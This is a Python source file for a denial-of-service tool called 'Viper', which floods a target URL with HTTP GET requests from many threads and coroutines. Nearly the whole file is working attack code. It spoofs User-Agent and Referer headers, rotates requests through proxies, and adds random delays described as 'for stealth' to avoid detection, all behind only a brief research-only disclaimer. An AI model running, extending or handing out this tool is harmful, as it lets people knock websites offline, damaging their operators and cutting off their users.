#!/usr/bin/env python3

"""
$Id: Viper DoS Tool $             
                                                                                                                                              
                                          █████                                           ████                                                     
                                         █████████                                    █████████                                                    
                                         █████████████████                    █████████████████                                                    
                                          █████████████████████████████████████████████████████                                                    
                                           ██████████████████████████████████████████████████                                                      
                                            ████████████████████████████████████████████████                                                       
                                              █████████████████████████████████████████████                                                        
                                   ███████     ██████████████████████████████████████████     ████████                                             
                                 ██████████     ████████████████████████████████████████     ██████████                                            
                                ███████████   █  ██████████████████████████████████████ ██   ████████████                                          
                              ██████████████  ███ ████████████████████████████████████ ███  ██████████████                                         
                             ████████████████  ███  ████████████████████████████████ ███   ████████████████                                        
                           ████████████████████  ███ ██████████████████████████████ ███  ████████████████████                                      
                          █████████████████████████████████████████████████████████████████████████████████████                                    
                        ████████████████████████████████████████████████████████████████████████████████████████                                   
                       ██████████████████████████████████████████████████████████████████████████████████████████                                  
                     ██████████████████████████████████████████████████████████████████████████████████████████████                                
                    █████████████     ████████████████████████████████████████████████████████████      ████████████                               
                  ███████████           █████████████████████████████████████████████████████████          ███████████                             
                 ███████████            ████████████████████████████████████████████████████████             ██████████                            
                ███████████              ██████████████████████████████████████████████████████               ██████████                           
               ███████████                ████████████████████              ██████████████████                ████████████                         
              ████████████                ██████████████                         █████████████                ████████████                         
               ███████████                 ██████████                              ██████████                 ███████████                          
                ███████████                 ████████                                ████████                 ███████████                           
                  ██████████                ████████                                 ███████                ███████████                            
                   ██████████                ███████                                 ██████                 █████████                              
                    ██████████      █         ██████                                 █████          █     ██████████                               
                      █████████     ██        ██████                                 █████        ██     ██████████                                
                       █████████     ██        █████                                 ████        ██     █████████                                  
                        █████████     ███       ████                                 ███        ██     █████████                                   
                          ████████     ███      ████                                 ███       ██     █████████                                    
                           ████████     ███      ███                                 ██      ███     █████████                                     
                            ████████     ███      ██                                 █      ███     ████████                                       
                             ████████     ███     ██                                 █     ███     ████████                                        
                               ███████     ████                                           ███     ████████                                         
                                ███████     ████                                        ████     ███████                                           
                                 ████████    ████                                      ████     ███████                                            
                                   ███████    ████                                    ████     ███████                                             
                                    ███████    █████                                 ████     ██████                                               
                                     ███████    █████                              ████      ██████                                                
                                       ██████    █████                            ████      ██████                                                 
                                        ██████    █████                          ████      █████                                                   
                                         ██████    ██████                       ████      █████                                                    
                                          ██████    ██████                     ████      █████                                                     
                                            █████     █████                  █████      █████                                                      
                                             █████     █████                █████      ████                                                        
                                              █████     █████              █████     █████                                                         
                                                ████     ██████           █████     █████                                                          
                                                 ████     ██████        ██████     ████                                                            
                                                  ████     ██████      ██████     ████                                                             
                                                   ████     ██████    ██████     ████                                                              
                                                     ███     ███████ ██████     ███                                                                
                                                      ███     ████████████     ███                                                                 
                                                       ███     ██████████     ███                                                                  
                                                         ██     ████████     ██                                                                    
                                                          ██     ██████     ██                                                                     
                                                           ██              ██                                                                      
                                                                                                                                                   
                                                                                                                                                   
                                                                                                                                                    
This tool is a DoS tool that is designed to put a heavy load on HTTP servers
to exhaust their resources and render them unresponsive.

⚠️ **Disclaimer**:
This tool is strictly for research and testing purposes only.
Any unauthorized or malicious usage of this tool is prohibited.

@author Vignesh A <vickyvignesh2102@gmail.com>
@date 2024-12-23
@version 1.0

"""


import argparse
import asyncio
import threading
import random
import requests
from itertools import cycle
import time
import logging

# Global configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

REFERERS = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
    "http://www.bing.com/search?q=",
    "http://www.yahoo.com/search?p=",
    "http://duckduckgo.com/?q=",
    "http://www.ask.com/web?q=",
    "http://search.aol.com/aol/search?q=",
    "http://www.baidu.com/s?wd=",
    "http://www.yandex.ru/yandsearch?text=",
    "http://search.yahoo.com/search?p=",
]

# Placeholder for proxies
PROXY_LIST = []
PROXY_CYCLE = None

# Function to load proxies from a file
def load_proxies(proxy_file):
    global PROXY_CYCLE
    with open(proxy_file, "r") as f:
        PROXY_LIST.extend([line.strip() for line in f if line.strip()])
    if PROXY_LIST:  # Only create cycle if proxies are available
        PROXY_CYCLE = cycle(PROXY_LIST)
    else:
        while True:
            choice = input("[WARNING] No proxies found in the file. Do you want to proceed without proxies? (Y/N): ").strip().lower()
            if choice == 'y':
                print("[INFO] Proceeding without proxies...")
                break
            elif choice == 'n':
                print("[INFO] Exiting as per user request.")
                exit(0)
            else:
                print("[ERROR] Invalid choice. Please enter Y or N.")

# Coroutine function for sending HTTP requests asynchronously
async def send_request(url, headers, proxy=None):
    try:
        # Random delay for stealth
        await asyncio.sleep(random.uniform(0.1, 0.5))

        # Choose the appropriate proxy
        proxies = {"http": proxy, "https": proxy} if proxy else None

        # Send the request
        response = requests.get(url, headers=headers, proxies=proxies, timeout=5)

        # Log the result
        logging.info(f"Sent request to {url} - Status Code: {response.status_code}")

    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")

# Coroutine loop for handling multiple asynchronous requests
async def coroutine_loop(url, headers, num_requests, proxy=None):
    tasks = []
    for _ in range(num_requests):
        tasks.append(send_request(url, headers, proxy))
    await asyncio.gather(*tasks)

# Thread function for managing coroutines
def thread_function(url, num_coroutines, requests_per_coroutine, proxy=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS)
    }
    asyncio.run(coroutine_loop(url, headers, requests_per_coroutine, proxy))

# Monitor thread for dynamic adjustment (placeholder functionality)
def monitor_thread():
    while True:
        logging.info("[MONITOR] Monitoring server response...")
        time.sleep(10)

# Main execution flow
def main():
    parser = argparse.ArgumentParser(description="Viper - Hybrid DoS Tool with Threads and Coroutines")
    parser.add_argument("--url", required=True, help="Target URL for the attack")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to spawn")
    parser.add_argument("--coroutines", type=int, default=50, help="Number of coroutines per thread")
    parser.add_argument("--requests", type=int, default=10, help="Number of requests per coroutine")
    parser.add_argument("--proxy-file", help="File containing proxy addresses")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging.")
    args = parser.parse_args()

    # Configure logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=log_level, format="%(asctime)s [%(levelname)s] %(message)s")

    # Load proxies if provided
    if args.proxy_file:
        load_proxies(args.proxy_file)

    threads = []
    for i in range(args.threads):
        # Fallback to no proxy if PROXY_CYCLE is empty or not set
        proxy = None
        if PROXY_CYCLE:
            try:
                proxy = next(PROXY_CYCLE)
            except StopIteration:
                pass  # No proxies left, continue without proxy

        t = threading.Thread(
            target=thread_function,
            args=(args.url, args.coroutines, args.requests, proxy),
        )
        threads.append(t)
        t.start()

    # Start a monitor thread
    monitor = threading.Thread(target=monitor_thread, daemon=True)
    monitor.start()

    # Wait for threads to complete
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
